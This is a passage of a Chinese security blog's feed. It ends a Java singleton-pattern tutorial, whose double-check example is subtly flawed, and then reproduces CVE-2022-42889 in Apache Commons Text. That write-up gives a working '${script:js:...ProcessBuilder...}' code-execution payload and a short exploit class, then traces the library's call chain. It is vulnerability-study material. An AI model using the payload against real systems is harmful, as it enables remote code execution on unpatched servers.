<span class="keyword">return</span> instance;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>说明：</strong></p><ul><li>看似线程安全，但不一定安全。</li><li>结论：不推荐使用。</li></ul><h3 id="双重检查"><a href="#双重检查" class="headerlink" title="双重检查"></a>双重检查</h3><p><strong>代码演示：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> HungryManStyle;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingletonTest6</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> Singleton.getInstance();  </span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instance2</span> <span class="operator">=</span> Singleton.getInstance();  </span><br><span class="line">        System.out.println(instance == instance2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//双重检查  </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton6</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton6 instance;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton6</span><span class="params">()</span> &#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//提供一个静态的公有方法，加入双重检查代码，解决线程安全问题，同时解决懒加载问题  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton6 <span class="title function_">getInstance</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton6.class) &#123;  </span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;  </span><br><span class="line">                    instance = <span class="keyword">new</span> <span class="title class_">Singleton6</span>();  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> instance;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优缺点说明：</strong></p><ul><li>Double-Check概念是多线程开发中常使用到的，如代码中所示，我们进行了两次 <code>if(singleton==null)</code> 检查，这样就可以保证线程安全了。</li><li>这样，实例化代码只用执行一次，后面再次访问时，判断 <code>if(singleton==null)</code>，直接 reeturn 实例化对象，也避免反复进行方法同步；</li><li>线程安全，延迟加载，效率较高；</li><li>结论：在实际开发中，推荐使用这种单例设计模式。</li></ul><h3 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h3><p><strong>代码演示：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> HungryManStyle;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingletonTest7</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Singleton7</span> <span class="variable">instance</span> <span class="operator">=</span> Singleton7.getInstance();  </span><br><span class="line">        <span class="type">Singleton7</span> <span class="variable">instance2</span> <span class="operator">=</span> Singleton7.getInstance();  </span><br><span class="line">        System.out.println(instance == instance2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//静态内部类  </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton7</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton7</span><span class="params">()</span> &#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//写一个静态内部类，该类中有一个静态属性Singleton  </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">singleInstance</span> &#123;  </span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Singleton7</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton7</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//提供一个静态的公有方法，直接返回对象  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton7 <span class="title function_">getInstance</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> singleInstance.INSTANCE;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优缺点说明：</strong></p><ul><li>静态内部类方式在 Singleton 类被装载时并不会立即实例化，而是在需要实例化时，调用 getInstance方法，会装载 SingletonInstance 类，从而完成 Singleton 的实例化；</li><li>类的静态属性只会在第一次加载类的时候初始化，所以在这里，JVM 帮助我们保证了线程的安全性，在类进行初始化时，别的线程是无法进入的；</li><li>优点：避免了线程不安全，利用静态内部类特点实现延迟加载，效率高；</li><li>结论：推荐使用</li></ul><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p><strong>代码演示：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> HungryManStyle;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingletonTest8</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Singleton8</span> <span class="variable">instance</span> <span class="operator">=</span> Singleton8.INSTANCE;  </span><br><span class="line">        <span class="type">Singleton8</span> <span class="variable">instance2</span> <span class="operator">=</span> Singleton8.INSTANCE;  </span><br><span class="line">        System.out.println(instance == instance2);  </span><br><span class="line">        instance.sayOK();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//使用枚举，可以实现单例  </span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Singleton8</span> &#123;  </span><br><span class="line">    INSTANCE;<span class="comment">//属性  </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayOK</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;ok&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优缺点说明：</strong></p><ul><li>这借助了JDK1.5中添加的枚举来实现单例模式，不仅能避免多线程同步问题，而且还能防止反序列化重新创建新的对象；</li><li>结论：推荐使用</li></ul><h2 id="0x03-单例模式注意事项和细节说明"><a href="#0x03-单例模式注意事项和细节说明" class="headerlink" title="0x03 单例模式注意事项和细节说明"></a>0x03 单例模式注意事项和细节说明</h2><p>单例模式保证了系统内存中该类只存在一个对象，节省了系统资源，对于一些需要频繁创建销毁的对象，使用单例模式可以提高系统性能。</p><ul><li>当想实例化一个单例类的时候，必须要记住使用相应的获得对象的方法，而不是使用new；</li><li>单例模式使用场景：需要频繁的进行创建和销毁的对象、创建对象时耗时过多或耗费资源过多（即：重量级对象），但又经常用到的对象、工具类对象、频繁访问数据库或文件的对象（比如数据源、session工厂等）。</li></ul><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>最近真是有点懒劲犯了，还是得多多专注，不要犯懒癌。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Java 设计模式之单例模式&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-42889 分析与 CodeQL</title>
    <link href="https://drun1baby.github.io/2023/05/23/CVE-2022-42889-%E5%88%86%E6%9E%90%E4%B8%8E-CodeQL/"/>
    <id>https://drun1baby.github.io/2023/05/23/CVE-2022-42889-%E5%88%86%E6%9E%90%E4%B8%8E-CodeQL/</id>
    <published>2023-05-23T10:51:35.000Z</published>
    <updated>2023-09-11T12:41:25.121Z</updated>
    
    <content type="html"><![CDATA[<p>复现 CVE-2022-42889 Apache Commons Text RCE 的同时，学习一下如何用 CodeQL 挖掘 CVE-2023-22665 的洞</p><span id="more"></span><h1 id="CVE-2022-42889-Apache-Commons-Text-RCE-漏洞分析"><a href="#CVE-2022-42889-Apache-Commons-Text-RCE-漏洞分析" class="headerlink" title="CVE-2022-42889 Apache Commons Text RCE 漏洞分析"></a>CVE-2022-42889 Apache Commons Text RCE 漏洞分析</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>CodeQL 实践</p><h2 id="0x02-漏洞相关信息"><a href="#0x02-漏洞相关信息" class="headerlink" title="0x02 漏洞相关信息"></a>0x02 漏洞相关信息</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Commons Text 执行变量插值 (variable interpolation)， 允许动态评估和扩展属性。插值的标准格式是 <code>&quot;$&#123;prefix:name&#125;&quot;</code>，其中 “prefix” 用于查找定位执行插值 <code>org.apache.commons.text.lookup.StringLookup</code> 的实例。从 1.5 版到 1.9 版，默认的 Lookup 实例集包括可能导致任意代码执行或与远程服务器联系的插值器。</p><ul><li>看到这个漏洞描述其实就是 JavaScriptEngine 没得跑了</li></ul><h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>1.5 &lt;&#x3D; Apache Commons Text &lt;&#x3D; 1.9</p><h2 id="0x03-漏洞基础"><a href="#0x03-漏洞基础" class="headerlink" title="0x03 漏洞基础"></a>0x03 漏洞基础</h2><h3 id="Apache-Commons-Text"><a href="#Apache-Commons-Text" class="headerlink" title="Apache Commons Text"></a>Apache Commons Text</h3><p>Apache Commons Text 该组件是一款处理字符串和文本块的开源项目，简单来说，除了核心 Java 提供的功能外，Apache Commons 文本库还包含了许多有用的实用程序方法，用于处理字符串。通常在开发过程中用于占位符和动态获取属性的字符串编辑工具包，常用于数据库查询前的语句替换，或者页面输出时的替换。</p><h2 id="0x04-环境搭建"><a href="#0x04-环境搭建" class="headerlink" title="0x04 环境搭建"></a>0x04 环境搭建</h2><p><strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-text<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x05-漏洞复现与分析"><a href="#0x05-漏洞复现与分析" class="headerlink" title="0x05 漏洞复现与分析"></a>0x05 漏洞复现与分析</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>按照官方文档的说法，<a class="link" href="https://commons.apache.org/proper/commons-text/userguide.html">https://commons.apache.org/proper/commons-text/userguide.html<i class="fas fa-external-link-alt"></i></a></p><p>一个简单的 demo 使用应该如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">StringSubstitutor</span> <span class="variable">interpolator</span> <span class="operator">=</span> StringSubstitutor.createInterpolator();</span><br><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> interpolator.replace(</span><br><span class="line">    <span class="string">&quot;Base64 Decoder:        $&#123;base64Decoder:SGVsbG9Xb3JsZCE=&#125;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;Base64 Encoder:        $&#123;base64Encoder:HelloWorld!&#125;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;Java Constant:         $&#123;const:java.awt.event.KeyEvent.VK_ESCAPE&#125;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;Date:                  $&#123;date:yyyy-MM-dd&#125;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;Environment Variable:  $&#123;env:USERNAME&#125;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;File Content:          $&#123;file:UTF-8:src/test/resources/document.properties&#125;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;Java:                  $&#123;java:version&#125;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;Localhost:             $&#123;localhost:canonical-name&#125;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;Properties File:       $&#123;properties:src/test/resources/document.properties::mykey&#125;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;Resource Bundle:       $&#123;resourceBundle:org.apache.commons.text.example.testResourceBundleLookup:mykey&#125;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;System Property:       $&#123;sys:user.dir&#125;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;URL Decoder:           $&#123;urlDecoder:Hello%20World%21&#125;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;URL Encoder:           $&#123;urlEncoder:Hello World!&#125;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;XML XPath:             $&#123;xml:src/test/resources/document.xml:/root/path/to/node&#125;\n&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>根据官方文档的说法，这里还支持一些其他关键字，比如 <code>dns</code>、<code>url</code>、<code>script</code>，对应的类是 <code>ScriptStringLookup</code>，进去看看</p><img src="/2023/05/23/CVE-2022-42889-%E5%88%86%E6%9E%90%E4%B8%8E-CodeQL/ScriptStringLookup.png" class><p>其中比较明显地能够看出来该如何构造语句</p><p><strong>PoC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:js:<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="string">&quot;Calc&quot;</span>).start()&#125;</span><br></pre></td></tr></table></figure><p>结合整体</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.text.StringSubstitutor;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">StringSubstitutor</span> <span class="variable">interpolator</span> <span class="operator">=</span> StringSubstitutor.createInterpolator();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;$&#123;script:js:new java.lang.ProcessBuilder(\&quot;calc\&quot;).start()&#125;&quot;</span>;  </span><br><span class="line">        interpolator.replace(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2023/05/23/CVE-2022-42889-%E5%88%86%E6%9E%90%E4%B8%8E-CodeQL/EXP.png" class><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这里主要是两个点，一为如何到 <code>JavaScript Engine</code>，二则是 Commons Text 如何调用 <code>JavaScript Engine</code></p><p>下断点调试一下，先看看 <code>StringSubstitutor.createInterpolator()</code></p><img src="/2023/05/23/CVE-2022-42889-%E5%88%86%E6%9E%90%E4%B8%8E-CodeQL/createInterpolator.png" class><p><strong>StringSubstitutor</strong>  类本质上就是一个字符串替换器，这里调用了对应的构造函数，创建了一些规则。跟进 <code>replace()</code> 方法</p><img src="/2023/05/23/CVE-2022-42889-%E5%88%86%E6%9E%90%E4%B8%8E-CodeQL/replace.png" class><p>往下，跟进 <code>substitute()</code> 方法，最后调用至 <code>org.apache.commons.text.StringSubstitutor#substitute</code> 方法</p><img src="/2023/05/23/CVE-2022-42889-%E5%88%86%E6%9E%90%E4%B8%8E-CodeQL/substitute.png" class><p>最终的结果是拿到 <code>varName</code>，也就是去掉首尾的后的内容。往下走，程序调用 <code>resolveVariable()</code> 方法，跟进。</p><img src="/2023/05/23/CVE-2022-42889-%E5%88%86%E6%9E%90%E4%B8%8E-CodeQL/resolveVariable.png" class><p>往下到 <code>org.apache.commons.text.lookup.ScriptStringLookup#lookup</code> 方法，在这之前处理了我们的 payload，对 <code>:</code> 前后的内容进行 <code>Split</code> 操作，再进行判断。接着就是 <code>javascript</code> 引擎被实例化了出来。跟进 <code>scriptEngine.eval()</code> 方法</p><img src="/2023/05/23/CVE-2022-42889-%E5%88%86%E6%9E%90%E4%B8%8E-CodeQL/eval.png" class><p>后续就是调用 <code>ScriptEngineManager</code> 命令执行的代码，不再展开。</p><h2 id="0x06-利用-CodeQL-挖掘-CVE-2022-42889"><a href="#0x06-利用-CodeQL-挖掘-CVE-2022-42889" class="headerlink" title="0x06 利用 CodeQL 挖掘 CVE-2022-42889"></a>0x06 利用 CodeQL 挖掘 CVE-2022-42889</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;复现 CVE-2022-42889 Apache Commons Text RCE 的同时，学习一下如何用 CodeQL 挖掘 CVE-2023-22665 的洞&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
</feed>
